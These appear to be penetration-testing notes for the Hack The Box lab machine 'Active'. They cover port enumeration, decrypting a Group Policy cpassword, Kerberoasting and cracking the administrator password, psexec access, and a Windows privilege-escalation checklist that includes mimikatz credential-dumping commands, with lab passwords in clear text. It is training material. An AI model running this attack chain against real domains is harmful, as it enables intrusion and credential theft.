### Enumeration
```
IP=10.10.10.10
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p -A $IP
nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
```
### Ports
- Banner Grab: nc -nv $IP PORT
- 53
	- DNS
- 88
	- kerberos
- 135
	- RPC
- 139
	- RPC
- 389
	- Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
- 445
	- smb
- 464
	- kpasswd5
- 593
	- RPC
- 636
	- tcpwrapped
- 3268
	- Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
- 3269
	- tcpwrapped
- 5722
	- RPC
- 9389
	- .NET Message Framing
- 47001
	- RPC
- 49152-49158
	- RPC
- 49169
	- RPC
- 49170
	- RPC
- 49179
	- RPC
### Foothold
- RPC/ SMB
	- enum4linux $IP
	- crackmapexec smb $IP -u guest -p "" --rid-brute
	- crackmapexec smb $IP -u "" -p "" --pass-pol
	- rpcclient -U '' $IP
		- enumdomusers
		- queryusergroups RID
		- queryuser RID
- 445
	- smbclient -N -L //$IP
		- ADMIN$  C$  IPC$  NETLOGON SYSVOL 
		- Replication (READ)
			- `Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
				- `active.htb\SVC_TGS:edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
				- cpassword decrypt
					- gpp-decrypt PASSWORD
						- GPPstillStandingStrong2k18
		- Users 
	- nmap --script smb-vuln* -p135,139,445 $IP
- SVC_TGS - GPPstillStandingStrong2k18
	- crackmapexec smb $IP -u SVC_TGS -p GPPstillStandingStrong2k18 --shares
		- READ NETLOGON SYSVOL Replication Users
		- Users
			- Nothing
	- impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
		- active/CIFS hash
		- Hash says administrator
		- hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
			- Ticketmaster1968
- CIFS - Ticketmaster1968
	- crackmapexec smb $IP -u administrator -p Ticketmaster1968 --shares
		- READ WRITE NETLOGON SYSVOL Replication Users
	- impacket-psexec active.htb/administrator@10.10.10.100
		- Able to get access as root
### PE
#### Windows
- USERNAME
	- whoami /all
	- Root drive directory
	- net user USERNAME
		- Check group memberships
	- systeminfo
		- `./wes.py ~/OSCP/boxes/BOX_NAME/systeminfo.txt  > ~/OSCP/boxes/BOX_NAME/systeminfo_exploits.txt`
	- history
		- (Get-PSReadLineOption).HistorySavePath
	- Users with console
	- Services
		- PS1: `Get-Service | Select-Object -Property Name, DisplayName, Status
		- Unquoted
			- cmd
				- wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
				- wmic service get name,displayname,pathname
			- PS1
				- Get-CimInstance -ClassName win32_service | Select Name,State,PathName
			- icacls Filepath before .exe
				- Looking for W or F
	- netstat -ano
		- Active ports
	- mimkatz
		- mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
		- mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
### Credentials
### Lessons Learned